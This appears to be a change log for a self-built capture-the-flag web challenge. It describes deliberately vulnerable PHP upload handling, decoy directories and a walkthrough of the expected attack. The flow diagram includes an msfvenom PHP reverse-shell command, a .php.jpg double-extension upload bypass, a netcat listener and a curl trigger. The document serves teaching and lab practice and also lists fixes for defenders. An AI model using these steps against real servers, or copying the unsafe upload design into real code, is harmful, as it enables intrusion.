# Flag 1 Changes - Web Enumeration & msfvenom Exploit

## Summary

Transformed Flag 1 into a realistic CTF challenge requiring proper web enumeration before exploitation. The challenge now follows industry-standard penetration testing methodology with feroxbuster/gobuster discovery, followed by msfvenom payload exploitation.

---

## Changed Files

### Core Website Changes

#### 1. `index.php`
**Changes:**
- ✅ Removed Upload-Übersicht aus der Hauptnavigation
- ✅ Entfernte direkte Verlinkung auf eine Galerie-Seite
- **Impact:** Übersicht liegt nun unter `/uploads/` und muss aktiv gefunden werden

#### 2. `robots.txt`
**Changes:**
- ✅ Betont `/uploads/`, `/data/`, `/config/`, `/old/`, `/backup_smb.sh` als relevante Einträge
- ✅ Fügte zusätzliche Decoy-Einträge wie `/admin/` hinzu
- **Impact:** Liefert Enumeration-Hinweise mit realistischer Ablenkung

#### 3. `.htaccess`
**Changes:**
- ✅ Added explicit deny rules for `/data/` and `/config/` directories
- **Impact:** Protects sensitive directories while keeping uploads/ vulnerable

### New Directories & Files

#### 4. `admin/index.php` (NEW)
**Purpose:** Fake admin login page (decoy)
- Non-functional login form
- Always returns 401 Unauthorized
- Adds realistic enumeration target

#### 5. `old/index.php` (NEW)
**Purpose:** "Under Construction" page (decoy)
- Looks like archived/deprecated content
- Contains HTML comment hinting at old systems
- Realistic red herring for CTF participants

#### 6. `config/index.php` (NEW)
**Purpose:** Protected configuration directory
- Returns 403 Forbidden
- Protected by .htaccess DirectoryMatch rule
- Shows proper security implementation

### Documentation

#### 7. `testing/EXPLOIT_GUIDE.md` (NEW)
**Comprehensive CTF walkthrough including:**
- Phase 1: Reconnaissance & Enumeration
  - robots.txt analysis
  - feroxbuster/gobuster usage with Kali wordlists
  - Directory discovery techniques
- Phase 2: Vulnerability Analysis
  - Understanding double-extension bypass
  - Upload mechanism analysis
- Phase 3: Payload Creation
  - msfvenom reverse shell (msfconsole)
  - msfvenom reverse shell (netcat)
  - Bind shell variant
  - Simple webshell for testing
- Phase 4: Upload & Execution
  - Browser and curl upload methods
  - Finding uploaded filenames
  - Triggering payloads
- Phase 5: Post-Exploitation
  - Shell stabilization
  - Flag capture
  - System enumeration
- Additional sections:
  - Complete attack flow diagram
  - Troubleshooting guide
  - Defense recommendations
  - Alternative techniques
  - Tools reference

### Installation & Testing

#### 8. `install.sh`
**Changes:**
- ✅ Added decoy directory creation (`/admin/`, `/old/`, `/config/`)
- ✅ Updated permission setting for new directories
- ✅ Enhanced installation output with enumeration hints
- ✅ Updated CTF participant instructions

#### 9. `testing/Dockerfile`
**Changes:**
- ✅ Added COPY commands for decoy directories
- ✅ Set proper permissions for decoys
- **Impact:** Docker environment mirrors production setup

#### 10. `testing/test-exploit.sh`
**Changes:**
- ✅ Added enumeration phase simulation
- ✅ Enhanced output to show discovered endpoints
- ✅ Added msfvenom usage instructions
- ✅ Included listener setup examples
- ✅ Added flag capture step
- **Impact:** Provides realistic testing workflow

#### 11. `testing/README.md`
**Changes:**
- ✅ Added Phase 1: Web Enumeration section
- ✅ Added Phase 2: Exploitation section
- ✅ Included feroxbuster/gobuster examples
- ✅ Added listener setup instructions
- ✅ Referenced EXPLOIT_GUIDE.md
- ✅ Updated vulnerability list

---

## Expected CTF Flow

```
┌─────────────────────────────────────────────────────────────┐
│ 1. RECONNAISSANCE                                           │
│    └── Visit target website                                 │
│    └── Check robots.txt → Discover hidden paths             │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 2. ENUMERATION                                              │
│    └── feroxbuster/gobuster with Kali wordlists             │
│    └── Discover:                                            │
│        • /uploads/ (directory) ← Upload-Übersicht          │
│        • /admin/ (200) - decoy                              │
│        • /old/ (200) - decoy                                │
│        • /config/ (403) - protected                         │
│        • /data/ (403) - protected                           │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 3. VULNERABILITY DISCOVERY                                  │
│    └── Explore uploads/index.php                            │
│    └── Identify upload functionality                        │
│    └── Test file upload validation                          │
│    └── Discover double-extension bypass (.php.jpg)          │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 4. PAYLOAD CREATION                                         │
│    └── msfvenom -p php/reverse_php LHOST=X LPORT=4444       │
│    └── Rename: shell.php → shell.php.jpg                    │
│    └── Setup listener: nc -lvnp 4444                        │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 5. EXPLOITATION                                             │
│    └── Upload shell.php.jpg über das Formular auf index.php │
│    └── Finde Dateinamen über /uploads/ oder data/uploaded_  │
│        files.txt                                            │
│    └── Trigger: curl http://target/uploads/photo_XXX.jpg    │
│    └── Receive reverse shell as www-data                    │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 6. FLAG CAPTURE                                             │
│    └── whoami → www-data                                    │
│    └── cat /home/webflag/flag.txt                           │
│    └── FLAG: flag{initial_access_luzernermoments_83723}     │
└─────────────────────────────────────────────────────────────┘
```

---

## Enumeration Targets

### Discoverable via robots.txt
- `/uploads/` - Upload-Übersicht und Dateiablage
- `/data/` - Protected data directory
- `/admin/` - Fake admin panel (decoy)
- `/old/` - Old site (decoy)
- `/config/` - Configuration directory (protected)
- `/backup_smb.sh` - Flag 2 hint

### Discoverable via feroxbuster/gobuster
All of the above plus:
- `/upload.php` - Upload handler (302 redirect)
- `/thanks.php` - Upload confirmation page
- `/.htaccess` - Apache configuration
- `/assets/` - CSS/static files

---

## Vulnerabilities (Intentional for CTF)

1. **Information Disclosure**
   - robots.txt reveals hidden paths
   - Upload-Verzeichnis `/uploads/` discoverable but nicht verlinkt

2. **Insufficient Upload Validation**
   - Only checks file extension, not content
   - No magic byte validation
   - Allows double-extensions (.php.jpg)

3. **Unsafe File Storage**
   - Uploads stored in web-accessible directory
   - PHP execution enabled in uploads/
   - No Content-Type enforcement

4. **www-data User Access**
   - Webserver can execute uploaded files
   - Can read flag in /home/webflag/

---

## Testing

### Local Testing (Docker)
```bash
cd testing/
docker-compose up -d

# Automatic test
bash test-exploit.sh

# Manual enumeration
feroxbuster -u http://localhost:8080/ -w /usr/share/wordlists/dirb/common.txt -x php

# Access uploads overview
curl http://localhost:8080/uploads/
```

### Production Deployment (Ubuntu Server)
```bash
# Clone repository
git clone https://github.com/Flurin17/cyberwars.git
cd cyberwars

# Run installation script as root
sudo bash install.sh

# Website available at http://<server-ip>/
```

---

## Tools Used

### Enumeration
- **feroxbuster** - Fast, recursive web enumeration
- **gobuster** - Directory/file brute forcing
- **curl** - HTTP requests and testing

### Exploitation
- **msfvenom** - Payload generation (Metasploit Framework)
- **msfconsole** - Metasploit console (for meterpreter)
- **netcat (nc)** - Reverse shell listener
- **curl** - Payload upload and triggering

### Wordlists (Kali Linux)
- `/usr/share/wordlists/dirb/common.txt`
- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- `/usr/share/seclists/Discovery/Web-Content/common.txt`

---

## Security Notes

### What Makes This Realistic CTF
1. ✅ Requires actual enumeration (not obvious)
2. ✅ Uses industry-standard tools (feroxbuster, msfvenom)
3. ✅ Includes decoys and false leads
4. ✅ Follows real-world attack methodology
5. ✅ Tests multiple skill areas (recon, exploitation, post-exploit)

### What Would Fix This (For Defenders)
1. ❌ Implement magic byte validation
2. ❌ Disable PHP execution in uploads/ (`php_flag engine off`)
3. ❌ Store uploads outside DocumentRoot
4. ❌ Randomize filenames completely (no extension preservation)
5. ❌ Implement Content-Type validation
6. ❌ Use Content Security Policy headers
7. ❌ Serve uploads from separate domain

---

## Files Summary

### Modified
- `index.php` - Removed gallery links
- `robots.txt` - Added enumeration targets
- `.htaccess` - Added directory protection
- `install.sh` - Added decoy setup
- `testing/Dockerfile` - Added decoys
- `testing/test-exploit.sh` - Added enumeration simulation
- `testing/README.md` - Updated documentation

### Created
- `admin/index.php` - Fake admin panel
- `old/index.php` - Under construction page
- `config/index.php` - Protected config directory
- `testing/EXPLOIT_GUIDE.md` - Complete exploitation guide
- `CHANGES_FLAG1.md` - This file

---

**Ready for CTF deployment!** 🎯

